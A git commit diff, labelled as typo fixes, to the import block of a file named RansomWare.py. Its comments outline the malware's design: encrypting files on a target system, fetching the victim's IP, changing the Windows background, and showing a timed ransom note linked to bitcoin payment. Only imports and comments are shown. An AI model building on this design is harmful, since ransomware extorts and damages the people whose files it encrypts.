b4d3725475959c9aa891c431e132ff72f723ca5d
NuggFrog <81323207+NuggFrog@users.noreply.github.com>
2023-04-20 10:44:49 -0400

    fixed more typos

--- RansomWare.py
+++ RansomWare.py
@@ -2,12 +2,12 @@
 from cryptography.fernet import Fernet # encrypt/decrypt files on target system
 import os # to get system root
 import webbrowser # to load webbrowser to go to specific website eg bitcoin
-import ctypes # so we can intereact with windows dlls and change windows background etc
+import ctypes # so we can interact with windows dlls and change windows background etc
 import urllib.request # used for downloading and saving background image
 import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
 import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
 import datetime # to give time limit on ransom note
-import subprocess # to create process for notepad and open ransom  note
+import subprocess # to create process for notepad and open ransom note
 import win32gui # used to get window text to see if ransom note is on top of all other windows
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
